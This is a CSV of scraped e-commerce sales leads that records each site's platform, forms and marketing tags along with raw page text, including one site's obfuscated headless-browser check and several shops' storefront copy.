lead_id,domain,platform,platform_evidence,has_cart,product_count_visible,brand_count_visible,category_count_visible,price_currency,has_email_form,has_contact_form,form_evidence,has_esp_tag,has_popup_script,popup_library,has_chat_widget,has_booking,cta_count_above_fold,has_reviews,has_promo_bar,page_text
1004,flient.net,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1019,projectstwentytwo.co.uk,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1020,sun2solar.in,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,Verifying that you are not a robot...
1023,www.dayaglow.com,woocommerce,woocommerce,True,0,0,0,,False,False,,mailchimp,False,,none,False,0,False,False,"// Flicker fix. Arama Ana Sayfa Kurumsal Blog Kategoriler Bujiteri Kolye Küpe Yüzük Bileklik Ev Dekorasyon Hediyelik Kırtasiye Tekstil Mağaza İletişim 0 öğe ₺ 0,00 Menü 0 öğe ₺ 0,00 #slide-27008 .wd-slide-container { --wd-align-items: center; --wd-justify-content: left; } #slide-27008.woodmart-loaded .wd-slide-bg { background-image:url(http://www.dayaglow.com/wp-content/uploads/2024/02/kurumsal-ve-modern-alisveris-temali-banner1-scaled.png); } #slide-27008 .wd-slide-bg { background-color:rgb(248,248,248); background-size:cover; background-position:center center; } #slide-27008 .wd-slide-inner { max-width:500px; } @media (max-width: 1024px) { #slide-27008 .wd-slide-inner { max-width:420px; } #slide-27008 .wd-slide-bg { } } @media (max-width: 768px) { #slide-27008 .wd-slide-container { --wd-align-items: center; --wd-justify-content: center; } #slide-27008.woodmart-loaded .wd-slide-bg { background-image:url(http://www.dayaglow.com/wp-content/uploads/2024/02/WhatsApp-Image-2025-07-09-at-22.30.43.jpeg); } #slide-27008 .wd-slide-inner { max-width:800px; } #slide-27008 .wd-slide-bg { background-size:cover; background-position:center center; } } #slide-27018 .wd-slide-container { --wd-align-items: center; --wd-justify-content: right; } #slide-27018.woodmart-loaded .wd-slide-bg { background-image:url(http://www.dayaglow.com/wp-content/uploads/2024/02/sonbahar-sezonu-yeni-koleksiyon-konulu-fotograf-kolaji-ile-olusturulmus-banner-scaled.png); } #slide-27018 .wd-slide-bg { background-color:rgb(248,248,248); background-size:cover; background-position:left center; } @media (max-width: 1024px) { #slide-27018 .wd-slide-bg { } } @media (max-width: 768px) { #slide-27018.woodmart-loaded .wd-slide-bg { background-image:url(http://www.dayaglow.com/wp-content/uploads/2024/02/WhatsApp-Image-2025-07-09-at-22.31.20.jpeg); } #slide-27018 .wd-slide-bg { background-size:cover; background-position:center center; } } .elementor-27008 .elementor-element.elementor-element-bfb79bf{--display:flex;--gap:0px 0px;--row-gap:0px;--column-gap:0px;--margin-top:0px;--margin-bottom:60px;--margin-left:0px;--margin-right:0px;}.elementor-27008 .elementor-element.elementor-element-e8c1d38 .wd-text-block{font-family:""Satisfy"", Sans-serif;font-size:48px;font-weight:400;line-height:1.3em;}.elementor-27008 .elementor-element.elementor-element-8b61158 .wd-text-block{font-family:""Lato"", Sans-serif;font-size:58px;font-weight:700;line-height:1.3em;}.elementor-27008 .elementor-element.elementor-element-240d823 > .elementor-widget-container{margin:0px 0px 10px 0px;}.elementor-27008 .elementor-element.elementor-element-240d823 .wd-text-block{font-family:""Lato"", Sans-serif;font-size:58px;font-weight:300;line-height:1.3em;}.elementor-27008 .elementor-element.elementor-element-a3330b8 > .elementor-widget-container{margin:0px 0px 30px 0px;}.elementor-27008 .elementor-element.elementor-element-a3330b8 .wd-text-block{font-size:18px;}@media(max-width:1024px){.elementor-27008 .elementor-element.elementor-element-e8c1d38 .wd-text-block{font-size:40px;}.elementor-27008 .elementor-element.elementor-element-8b61158 .wd-text-block{font-size:42px;}.elementor-27008 .elementor-element.elementor-element-240d823 .wd-text-block{font-size:42px;}.elementor-27008 .elementor-element.elementor-element-a3330b8 .wd-text-block{font-size:16px;}}@media(max-width:768px){.elementor-27008 .elementor-element.elementor-element-e8c1d38 .wd-text-block{font-size:36px;}.elementor-27008 .elementor-element.elementor-element-8b61158 .wd-text-block{font-size:38px;}.elementor-27008 .elementor-element.elementor-element-240d823 .wd-text-block{font-size:38px;}.elementor-27008 .elementor-element.elementor-element-a3330b8 .wd-text-block{font-size:14px;}} DayaGlow Stiline Isık Tutacak Seçimler DayaGlow’da bijuteriden tekstile, kırtasiyeden ev dekorasyonuna kadar aradığınız her şey tek çatı altında. Kendinize ya da sevdiklerinize özel seçimler için hemen keşfedin. Mağaza .elementor-27018 .elementor-element.elementor-element-bfb79bf{--display:flex;--flex-direction:row-reverse;--container-widget-width:initial;--container-widget-height:100%;--container-widget-flex-grow:1;--container-widget-align-self:stretch;--flex-wrap-mobile:wrap-reverse;}.elementor-27018 .elementor-element.elementor-element-0108793{--display:flex;--justify-content:center;--gap:0px 0px;--row-gap:0px;--column-gap:0px;--margin-top:0px;--margin-bottom:60px;--margin-left:0px;--margin-right:0px;}.elementor-27018 .elementor-element.elementor-element-e8c1d38 .wd-text-block{font-family:""Satisfy"", Sans-serif;font-size:48px;font-weight:400;line-height:1.3em;}.elementor-27018 .elementor-element.elementor-element-8b61158 .wd-text-block{font-family:""Lato"", Sans-serif;font-size:58px;font-weight:700;line-height:1.3em;}.elementor-27018 .elementor-element.elementor-element-240d823 > .elementor-widget-container{margin:0px 0px 10px 0px;}.elementor-27018 .elementor-element.elementor-element-240d823 .wd-text-block{font-family:""Lato"", Sans-serif;font-size:58px;font-weight:300;line-height:1.3em;}.elementor-27018 .elementor-element.elementor-element-a3330b8 > .elementor-widget-container{margin:0px 0px 30px 0px;}.elementor-27018 .elementor-element.elementor-element-a3330b8 .wd-text-block{max-width:480px;font-size:18px;}.elementor-27018 .elementor-element.elementor-element-3025e59{--display:flex;--flex-direction:row;--container-widget-width:initial;--container-widget-height:100%;--container-widget-flex-grow:1;--container-widget-align-self:stretch;--flex-wrap-mobile:wrap;--justify-content:center;--flex-wrap:nowrap;}.elementor-27018 .elementor-element.elementor-element-ae75f32 .wd-button-wrapper a{background-color:#CECECE;border-color:#CECECE;}.elementor-27018 .elementor-element.elementor-element-ae75f32 .wd-button-wrapper:hover a{background-color:#C9C9C9;border-color:#C9C9C9;}@media(max-width:1024px){.elementor-27018 .elementor-element.elementor-element-e8c1d38 .wd-text-block{font-size:40px;}.elementor-27018 .elementor-element.elementor-element-8b61158 ."
1032,angushalalmeat.co.uk,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1035,filtrwody.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,DNS resolution failed (transient resolver error)
1040,outillageaouami.com,woocommerce,woocommerce,True,12,0,3,$,False,False,,none,True,generic,none,False,7,False,False,"gtag(""event"", ""page_view"", {send_to: ""GLA""}); Skip to content Skip to footer Lun - Ven 9:00 AM – 5:00 PM | SAM 9:00 AM – 3:00 PM +212 665-654573 60 AV HAROUN ERRACHID Q. SOUANI, Av. de Prv Tanger Accueil À propos Produits Blogs Contact Informations de livraison Demander un devis Accueil À propos Produits Blogs Contact Informations de livraison Demander un devis 0 items - 0.00 DH 0 Demander un devis Close Accueil À propos Produits Blogs Contact Informations de livraison Des outils de qualité, des possibilités infinies ! Votre quincaillerie spécialisée en outillage de qualité. Pour tous vos projets de bricolage et de construction, nous avons ce qu'il vous faut. Venez nous voir pour concrétiser vos idées! Nos produits À propos de nous setREVStartSize({c: 'rev_slider_1_1',rl:[1240,1460,785,500],el:[1033.99,700,480,480],gw:[1920,1440,778,480],gh:[1034,700,480,480],type:'hero',justify:'',layout:'fullscreen',offsetContainer:'',offset:'',mh:""480px""});if (window.RS_MODULES!==undefined && window.RS_MODULES.modules!==undefined && window.RS_MODULES.modules[""revslider11""]!==undefined) {window.RS_MODULES.modules[""revslider11""].once = false;window.revapi1 = undefined;if (window.RS_MODULES.checkMinimal!==undefined) window.RS_MODULES.checkMinimal()} Nos Catégories Nos catégories populaires Matériel de lavage Shop Now Câbles et accessoires Shop Now Chauffage et Climat Shop Now électricité Shop Now Peinture Shop Now Grande Variété Grand inventaire de produits Bon Prix Prix compétitifs raisonnables Meilleure qualité Produits approuvés Disponibilité à votre service Notre magasin Derniers produits TABOURET D’ATELIER ROULANT RÉGLABLE 400.00 DH Add to Cart CLOUEUSE AGRAFEUSE ELECTRIQUE 500.00 DH Add to Cart ESCABEAU METAL COULEUR NOIR 2 MARCHES 280.00 DH Add to Cart MESURE LASER 70M 280.00 DH Add to Cart articles Découvrez notre industrie dans nos blogs La Quincaillerie, et Magasin d’Outillage Business notamment à tanger. est un métier très difficile et délicat. Nous partageons nos idées à ce sujet dans nos blogs. Bâtiment juin 17, 2026 DALAKIT 3 CM Maroc : Prix m², Terrasse et Plafond 2026 Drainage & Assainissement avril 24, 2026 Drainage Maroc : Tube 6m et Rouleau avec Manchon – Prix et Guide Sanitaire Combiné Apparent Douche Noir : design moderne et confort au quotidien mars 11, 2022 Nous sommes toujours disponibles. Contactez-nous ou demandez un devis Demandez un devis Contactez-nous LUNDI -JEUDI 9:00 AM – 5:00 PM VENDREDI 9:00 AM – 12:30 PM 2:30 PM – 5:00 PM SAMEDI 9:00 AM – 3:00 PM Office 60 AV HAROUN ERRACHID Q. SOUANI, Av. de Provence, Tanger 90000 Contact@outillageaouami.com +212 531-400403 +212 665-654573 Links Accueil Produits À propos Contact window.RS_MODULES = window.RS_MODULES || {}; window.RS_MODULES.modules = window.RS_MODULES.modules || {}; window.RS_MODULES.waiting = window.RS_MODULES.waiting || []; window.RS_MODULES.defered = false; window.RS_MODULES.moduleWaiting = window.RS_MODULES.moduleWaiting || {}; window.RS_MODULES.type = 'compiled'; {""prefetch"":[{""source"":""document"",""where"":{""and"":[{""href_matches"":""/*""},{""not"":{""href_matches"":[""/wp-*.php"",""/wp-admin/*"",""/wp-content/uploads/*"",""/wp-content/*"",""/wp-content/plugins/*"",""/wp-content/themes/m2/*"",""/*\\?(.+)""]}},{""not"":{""selector_matches"":""a[rel~=\""nofollow\""]""}},{""not"":{""selector_matches"":"".no-prefetch, .no-prefetch a""}}]},""eagerness"":""conservative""}]} const lazyloadRunObserver = () => { const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` ); const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => { entries.forEach( ( entry ) => { if ( entry.isIntersecting ) { let lazyloadBackground = entry.target; if( lazyloadBackground ) { lazyloadBackground.classList.add( 'e-lazyloaded' ); } lazyloadBackgroundObserver.unobserve( entry.target ); } }); }, { rootMargin: '200px 0px 200px 0px' } ); lazyloadBackgrounds.forEach( ( lazyloadBackground ) => { lazyloadBackgroundObserver.observe( lazyloadBackground ); } ); }; const events = [ 'DOMContentLoaded', 'elementor/lazyload/observe', ]; events.forEach( ( event ) => { document.addEventListener( event, lazyloadRunObserver ); } ); (function () { var c = document.body.className; c = c.replace(/woocommerce-no-js/, 'woocommerce-js'); document.body.className = c; })(); if(typeof revslider_showDoubleJqueryError === ""undefined"") {function revslider_showDoubleJqueryError(sliderID) {console.log(""You have some jquery.js library include that comes after the Slider Revolution files js inclusion."");console.log(""To fix this, you can:"");console.log(""1. Set 'Module General Options' -> 'Advanced' -> 'jQuery & OutPut Filters' -> 'Put JS to Body' to on"");console.log(""2. Find the double jQuery.js inclusion and remove it"");return ""Double Included jQuery Library"";}} <div class=""woocommerce-variation-description"">{{{ data.variation.variation_description }}}</div> <div class=""woocommerce-variation-price"">{{{ data.variation.price_html }}}</div> <div class=""woocommerce-variation-availability"">{{{ data.variation.availability_html }}}</div> <p role=""alert"">Désolé, ce produit n&rsquo;est pas disponible. Veuillez choisir une combinaison différente.</p> var ht_ctc_chat_var = {""number"":""212665654573"",""pre_filled"":""Bonjour,\r\n\r\nJe souhaite avoir plus d\u2019informations sur ce produit :\r\nAccueil\r\n\r\nLien du produit :\r\nhttp://outillageaouami.com/\r\n\r\nQuel est le d\u00e9lai et le mode de livraison, s\u2019il vous pla\u00eet ?\r\n\r\nMerci."",""dis_m"":""show"",""dis_d"":""show"",""css"":""display: none; cursor: pointer; z-index: 99999999;"",""pos_d"":""position: fixed; bottom: 20px; right: 20px;"",""pos_m"":""position: fixed; bottom: 20px; right: 20px;"",""schedule"":""no"",""se"":""150"",""ani"":""no-animation"",""url_target_d"":""_blank"",""ga"":""yes"",""fb"":""yes"",""display"":""no"",""g_init"":""default"",""g_an_event_name"":""click to chat"",""pixel_event_name"":""Click to Chat by HoliThemes""}; var ht_ctc_variables = {""g_an_event_name"":""click to chat"",""pixel_event_type"":""trackCustom"",""pixel_event_name"":""Click to Chat by Holi"
1041,mgamotors.ge,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1044,jjtrucktrailerparts.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1058,rcp-tools.ro,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"Loader Please wait while your request is being verified... var a0Y=a0U;function a0a(){var Q=['plugins','entries','navigator','test','GET','ById','type','submit','344662PSbtOv','2822344ltnVWf','languages','onreadysta','419578QPHGky','mimeTypes','1913868ZGXXUf','userAgent','document','3ncDfxN','value','(((.+)+)+)','__proto__','language','cttl','name','createElem','search','prototype','toString','form','append','appVersion','a6105c0a61','DOMContent','d49030b349','forEach','action','ent','0950635027','input','style','stener','webdriver','2588576kGIYRY','ne;','addEventLi','attachEven','display:no','appendChil','constructo','7fa3b767c4','16692016wdgMuF','Loaded','length','1b41b08f12','hidden','2461225wXYuHz','map'];a0a=function(){return Q;};return a0a();}function a0U(T,n){var a=a0a();return a0U=function(U,b){U=U-0x144;var s=a[U];return s;},a0U(T,n);}(function(T,n){var a0c={T:0x164,n:0x169,a:0x166,U:0x161,b:0x151},t=a0U,a=T();while(!![]){try{var U=parseInt(t(0x160))/0x1+-parseInt(t(a0c.T))/0x2*(parseInt(t(a0c.n))/0x3)+-parseInt(t(0x149))/0x4+-parseInt(t(0x156))/0x5+-parseInt(t(a0c.a))/0x6+-parseInt(t(a0c.U))/0x7+parseInt(t(a0c.b))/0x8;if(U===n)break;else a['push'](a['shift']());}catch(b){a['push'](a['shift']());}}}(a0a,0x57d88));var a0b=window[a0Y(0x15a)],a0s={'webdriverCheck':function(){var a0Z={T:0x148},i=a0Y;return i(0x148)in window||!!a0b[i(a0Z.T)];},'userAgentCheck':function(){var B=a0Y;return/headless|bytespider/i[B(0x15b)](a0b[B(0x167)]);},'appVersionCheck':function(){var a0v={T:0x15b,n:0x176},h=a0Y;return/headless/i[h(a0v.T)](a0b[h(a0v.n)]);},'pluginArraySpoofing':function(){var a0S={T:0x172,n:0x16c,a:0x153},g=a0Y;let T=PluginArray[g(a0S.T)]===a0b[g(0x158)][g(a0S.n)];if(a0b[g(0x158)][g(a0S.a)]>0x0)T&=Plugin[g(a0S.T)]===a0b[g(0x158)][0x0][g(0x16c)];return!T;},'mimeTypeArraySpoofing':function(){var a0J={T:0x16c,n:0x153},o=a0Y;let T=MimeTypeArray[o(0x172)]===a0b[o(0x165)][o(a0J.T)];if(a0b[o(0x165)][o(a0J.n)]>0x0)T&=MimeType['prototype']===a0b[o(0x165)][0x0]['__proto__'];return!T;},'noLanguage':function(){var a0E={T:0x162,n:0x153},F=a0Y;return!a0b[F(0x16d)]||a0b[F(a0E.T)][F(a0E.n)]===0x0;},'zeroOuterDimensions':function(){return window['outerHeigh'+'t']===0x0&&window['outerWidth']===0x0;}},a0p=function(a,U){var a0m={T:0x14b,n:0x168,a:0x14c,U:0x163},a0K={T:0x16b,n:0x173,a:0x14f},d=a0Y,b=(function(){var p=!![];return function(r,V){var R=p?function(){if(V){var C=V['apply'](r,arguments);return V=null,C;}}:function(){};return p=![],R;};}()),s=b(this,function(){var u=a0U;return s[u(0x173)]()[u(0x171)](u(a0K.T)+'+$')[u(a0K.n)]()[u(a0K.a)+'r'](s)[u(0x171)](u(a0K.T)+'+$');});s(),window[d(a0m.T)+'stener']?window[d(a0m.n)]['addEventLi'+d(0x147)](d(0x178)+d(0x152),a,U):window[d(0x168)][d(a0m.a)+'t'](d(a0m.U)+'techange',a);};a0p(function(){var a0k={T:0x170,n:0x168,a:0x17c,U:0x145,b:0x170,s:0x170,p:0x145,r:0x145,V:0x159,R:0x175,C:0x154,L:0x175,G:0x17a,e:0x173,q:0x14d,A:0x17b,N:0x16f,l:0x155,f:0x16a,x:0x15e,y:0x15e,Y:0x14e,c:0x15f};setTimeout(function(){var z=a0U,T=window[z(0x168)]['getElement'+z(0x15d)]('eimg56or0vwi'),n=+((+!+[]+!![]+!![]+!![]+!![]+!![])+(+!+[]+!![]+!![]+!![]+!![]+[])+(+![])+(+!+[]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(+!+[]+!![]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])),a=window[z(0x168)][z(a0k.T)+z(0x17c)](z(0x174)),U=window[z(a0k.n)]['createElem'+z(0x17c)](z(0x145)),b=window['document'][z(0x170)+z(a0k.a)](z(a0k.U)),s=window['document'][z(a0k.b)+'ent']('input'),p=window['document'][z(a0k.s)+'ent'](z(a0k.p)),r=window[z(0x168)][z(0x170)+'ent'](z(a0k.r)),V=+((+!+[]+!![]+!![]+!![]+!![]+!![])+(+!+[]+!![]+!![]+!![]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![])+(+!+[]+!![]+!![]+!![]+!![]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![])+(+![]+[])+(+!+[]+!![]+!![]+!![])),R='wsidchk',C='pdata',L='http%3A%2F%2Frcp-tools.ro',G='/z0f76a1d14fd21a8fb5fd0d03e0fdc3d3cedae52f',e='failedChecks',q=Object[z(a0k.V)](a0s)[z(0x157)](([f,x])=>{try{return x()?f:null;}catch(y){return null;}})['filter'](f=>f!==null),A=q['length']>0x0;if(A){var N=new URLSearchParams();N[z(a0k.R)]('id',z(0x177)+z(a0k.C)+z(0x144)+'9e'),N[z(0x175)]('ts','1787940504'),N['append'](R,n+V),N[z(a0k.L)](C,L),N[z(a0k.R)](z(0x16e),'0'),q[z(a0k.G)](f=>N[z(0x175)](e,f));var l=new XMLHttpRequest();l['open'](z(0x15c),G+'?'+N[z(a0k.e)]()),l['send'](null);}else a['id']='eimg56or0vwi',a[z(0x146)]=z(a0k.q)+z(0x14a),a['method']=z(0x15c),a[z(a0k.A)]=G,U['id']='ywmwwtsdpnun',U[z(a0k.N)]=R,U[z(0x16a)]=n+V,U[z(0x15e)]=z(a0k.l),s[z(a0k.N)]='id',s['value']=z(0x150)+'60b54a2be4'+z(0x179)+'c7',s['type']=z(a0k.l),p[z(a0k.N)]='ts',p[z(a0k.f)]='1787940504',p[z(0x15e)]=z(0x155),b['id']='g5u18v15c2p7',b[z(a0k.N)]=C,b['value']=L,b[z(a0k.x)]='hidden',r['name']=z(0x16e),r[z(0x16a)]='0',r[z(a0k.y)]='hidden',a[z(a0k.Y)+'d'](U),a[z(0x14e)+'d'](b),a[z(0x14e)+'d'](s),a[z(0x14e)+'d'](p),a['appendChil'+'d'](r),T[z(0x14e)+'d'](a),a[z(a0k.c)]();},0x3e8);},![]);"
1076,almelaw.com,woocommerce,woocommerce,True,0,0,0,,True,False,email@address.com,none,True,generic,none,False,0,False,False,"+389 78 201 589 contact@almelaw.com Македонски Shqip English +389 78 201 589 Имиграција Обновлива енергија 360° за ИТ 360° за стартап Блог Тим Контакт Закажи состанок Македонски Shqip English Cart Menu Account Влез Клиентско име или email адреса * Лозинка * Запамти ме Најави се Ја заборавивте лозинката? Cart Нема продукти во Кошничката. правни партнери на претприемачите и иноваторите Обезбедуваме правна експертиза на бизнисите, иновациите и технолошките проекти во сите фази на развој. Закажи состанок Специјализирани за ИТ индустријата Корисници на најновите технологии Правни услуги за новите бизнис генерации Специјализација во трговско и деловно право Со специјалност во трговското и деловното право, работиме со голем број мали и средни компании, овозможувајќи темелно познавање на проблемите со кои тие се соочуваат. Дел од законите кои ги работиме: Услуги пред Централен Регистар Услуги од работните односи Услуги за регистрација на трговска марка Услуги за заштита на личните податоци (GDPR) Услуги за присилна наплата над долг Услуги за доделување удел преку ЕСОП во ДОО Вештачка интелигенција усогласување Трговски марки интелектуална сопственост Како овластени застапници за заштита на правата од интелектуална сопственост, водиме соодветни постапки со цел вашите вашите иновации, креации и бренд бидат заштитени од злоупотреба. Основање и Промени во компании Oсновањето на трговски друштва, промени на управител, сопственици, основна главнина, седиште, е-маил, подружница, како и ликвидација на трговски друштва се дел од услугите кои ги вршиме како овластени регистрациони агенти. Тајност и заштита на лични податоци Технички и организациски мерки за заштита на личните податоци е задолжение за Трговските Друштва кои обработуваат збирки на лични податоци. Потребно е да се донесат и имплементираат Правилници за заштита. Состав и ревизија на Договори Вршиме состав и ревизија на различни видови договори: Договори за доверливост, Развој на софтвер, Договори за вработување, Договори за инвестирање, Купопродажба на имот итн. Стартапи и Инвеститори Правна навигација во постапки за прибирање на инвестиции, преку ангел-инвеститори, акцелератори, фондови на ризичен капитал. Состав на инвестициска документација, регистрации на странски директни инвестции. Работни Дозволи Престој за странци Спроведување на постапки за добивање на работна дозвола за странци, добивање на престој и имигрирање во Македонија, преку своја или друга компанија. Провери колку твојата компанија е изложена на глоби пополни тест и добиј инстант резултат Адвокати за дигиталната ера Дејан Алексов Адвокат Дејан Алексов е адвокат од 01.01.2017 година кога ја основа адвокатската канцеларија Алексов, која во 2022 година во партнерство со адвокат Артан Мемиши прераснува во адвокатска канцеларија Алексов и Мемиши. Прочитај повеќе Артан Мемиши Адвокат Артан Мемиши, адвокат од 01.10.2020 година. Овластен застапник за заштита на права од индустриска сопственост. Специјализација во неколку области меѓу кои: имиграција и дозволи за престој, државјанство, работни спорови, стечај и ликвидација на фирми. Прочитај повеќе Кристијан Стевчев Адвокат Кристијан Стевчев, адвокат од 01.05.2024 година. Специјализира во неколку области меѓу кои: заштита на лични податоци, договори за развој на софтвер, инвестиции во стартап компании од ангел инвеститори, акцелератори и фондови на ризичен капитал. Прочитај повеќе Јелица Мелова Адвокатски приправник Јелица Мелова е со завршени мастер студии на факултетот Јустинијан Први при УКИМ. Во канцеларијата го реализира својот приправнички стаж за полагање на правосудниот испит. Прочитај повеќе Амел Муриќ Надворешен соработник за даночни прашања Амел Муриќ е надворешен соработник за даночни прашања. Неговата експертиза е во различни даночни области кои го опфаќаат домашното даночно право и меѓународното. Прочитај повеќе Павлина Павлоска Надворешен соработник за прашања од Нотаријатот Павлина е надворешен соработник на адвокатската канцеларија Алексов и Мемиши за прашања од областа на Нотаријатот, заверки и солемнизации на различни видови на договори за територијата на град Скопје. Прочитај повеќе Мила Мишовска Соработник за информативни содржини Мила Мишовска е соработник за информативни содржини, која правните и комплексни информации од актуелната регулатива ги прави лесно разбирливи. Прочитај повеќе Дејан Алексов Адвокат Адвокат, број на лиценца 3981 со прием во адвокатска комора на 01.01.2017 година Овластен регистрационен агент Ко-основач и член на управен одбор на Стартап Македонија Автор на it.mk Ментор на Стартап Викенд, Fintech Академија и активен учесник во стартап заедницата Учесник во работни групи за подобрување на регулативата за трговски друштва (воведување на конвертибилен заем, закон за бизнис ангели, предлог иницијатива за воведување друштво со променлив капитал – ДПК) Специјализација за: Регулатива и информатичка технологија; Заштита на лични податоци (GDPR); Инвестициски постапки за ангели инвеститори, акцелератори и фондови на ризичен капитал; Стартап компании и регулатива; FinTech и регулатива (платежни услуги и платни системи, PSD2); Договори за развој на софтвер и одржување Био Дејан Алексов е адвокат од 01.01.2017 година кога ја основа адвокатската канцеларија Алексов, која во 2022 година во партнерство со адвокат Артан Мемиши прераснува во адвокатска канцеларија Алексов и Мемиши. Во 2016 година заедно со неколку ко-основачи ја регистрираат непрофитната организација Стартап Македонија , која има за цел да го олесни вмрежувањето меѓу сите стартап учесници и да поттикне нивна соработка. Од 2018-2021 е претседател на Стартап Македонија, а од 2021 па наваму е дел од управниот одбор и работи на подобрување на регулативата за стартап компании ( воведување на конвертибилен заем , закон за бизнис ангели, воведување нов вид на трговско друштво, друштво со променлив капитал). Од 2017 година е автор на It.mk – портал за информатичка технологија, на која редовно пишува информативни содржини поврзани со регулативата,"
1087,paperclipsplus.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1092,soorajachar.com,woocommerce,woocommerce,True,0,0,0,,False,False,,omnisend,True,generic,none,True,3,False,False,"Home About Me Achievements Read My Books Contact Us Get Consultation Author & Numerology Consultant Sooraj Achar Welcome An Author & A Numerology Coach Sooraj Achar, the Accomplished Author of 35+ Books – A Sensational #1 Bestseller Across the Globe Free Welcome Gift Destiny Understand current issues in your live Life path Discover your innate abilities What we do We know everything about Numerology, Vastu, NLP, Self Healing. Embark on a transformative journey with our “Numerology Mastery Series.” Begin by exploring the foundational knowledge in the first six chapters of “Master Your DESTINY With Numerology.” These chapters lay the groundwork, unraveling the mysteries of numerology and connecting your birthdate to life’s intricate tapestry. Download Your “Free Book” By Clicking the Below Button: Download Free Numerology Mastery Book My Services Author Services I offer expert guidance and support for writers at every stage of their journey, from manuscript editing and formatting to publishing and marketing. Empower your writing dreams with personalized and professional solutions. Numerology Services. Unlock the secrets of your life’s path with Numerology Services by Sooraj Achar . Discover insights into your personality, relationships, and destiny through personalized numerology readings designed to guide you toward success, happiness, and self-awareness. HERE IS HOW CAN I HELP YOU Self Publish Your Own Books Empower Your Creativity and Share your stories with the world through self-Publishing Contact Now Read My Books at Amazon Dive into captivating worlds and enrich your mind with collection of books, available on amazon. Check Out Now FAQ Feel free to ask more questions What is numerology? Numerology is the study of numbers and their influence on a person’s life. It is based on the idea that numbers have symbolic meanings and can reveal insights into personality, relationships, and life paths. Can numerology predict my future? Numerology doesn’t predict specific events but offers guidance by highlighting strengths, challenges, and tendencies. It helps you make informed decisions by understanding yourself better. Can numerology help in relationships? Yes, numerology can offer insights into compatibility by comparing the numbers of two individuals. It helps understand personality traits and how they align in a relationship. 1-2-1 Free 30-Minutes Numerology Consultation For the complete detailed Report, Consultation/Name Spelling Suggestions and Recommendations: Reach Me Out Testimonials Hear from Our Clients      Rated 5 out of 5 “2021 is a difficult year for me. I have consulted a few numerologists. I have received vague answers and complicated solutions. I’m new to numerology. Charges were expensive. Sooraj is a good and kind soul. He is very patient with me. He answered all my questions. I had 1000 questions. More ever he helped me to find a business name with no extra charges. I’m grateful to him. With your help, I’m sorted out with my business name. I had a lot of anxiety about it. I’m confident now. Sooraj is a helpful soul. He is patient and explains if one has questions. He doesn’t rush into closing the job. You can consult him easily. I am going to recommend him to newbies like me. He is not going to cheat you or misguide you”. Ekta Gupta – Kolkata, India      Rated 5 out of 5 “Sooraj is a gem as a human and as a professional. Before approaching Sooraj, I have enquired and got inputs from other numerologists and I did some research as well. I Was not satisfied with the answers provided by them and most of them were behind fees, even after paying for the consultation they charge extra for clarifying doubts. However, Sooraj was awesome in client satisfaction and the way he follows up with the client for providing suggestions. He takes the initiative to follow up and provide the best solutions and describes the reason for the input. I definitely suggest Sooraj to anyone who is looking for start-up business names or anything related to numerology. He has a good amount of knowledge and patience to answer all my queries”. Naveen Kumar - Bengaluru, India      Rated 4 out of 5 “Hi Sooraj, it’s a great prediction starting from Personality Traits to our Abroad Opportunities to future achievements. Everything is perfectly predicted with correct proof and explanations which help us to understand our lives better and take steps accordingly to numerology. Everyone are curious to know more about their life just to know when, how & what situations they will come across and how they need to overcome everything. Thanks a lot, Sooraj, for the best Numerology Prediction which helped us to understand ourselves better”. Sneha S - Karnataka, India Get in touch Want to Publish Book as an author OR Consultancy? Reach Me Our and I will get back to You. Get started Sooraj Achar Sooraj Achar is an Amazon #1_BestSelling Author of 25+ Books & Sold Thousands of Copies Worldwide🌍 He is also a Numerology and Vastu – Coach & Consultant✅ Contact Us 19, Rose Vista, Bangalore – 560063 Call Us: +91 72593 26197 info@soorajachar.com Sign Up for Email Updates Copyright ©2026 Sooraj Achar. All rights reserved. Home About Us Our Team Shop Blog Contact Us {""prefetch"":[{""source"":""document"",""where"":{""and"":[{""href_matches"":""\/*""},{""not"":{""href_matches"":[""\/wp-*.php"",""\/wp-admin\/*"",""\/wp-content\/uploads\/*"",""\/wp-content\/*"",""\/wp-content\/plugins\/*"",""\/wp-content\/themes\/mysta\/*"",""\/*\\?(.+)""]}},{""not"":{""selector_matches"":""a[rel~=\""nofollow\""]""}},{""not"":{""selector_matches"":"".no-prefetch, .no-prefetch a""}}]},""eagerness"":""conservative""}]} const lazyloadRunObserver = () => { const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` ); const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => { entries.forEach( ( entry ) => { if ( entry.isIntersecting ) { let lazyloadBackground = entry.target; if( lazyloadBackground ) { lazyloadBackground.classList.add( 'e-l"
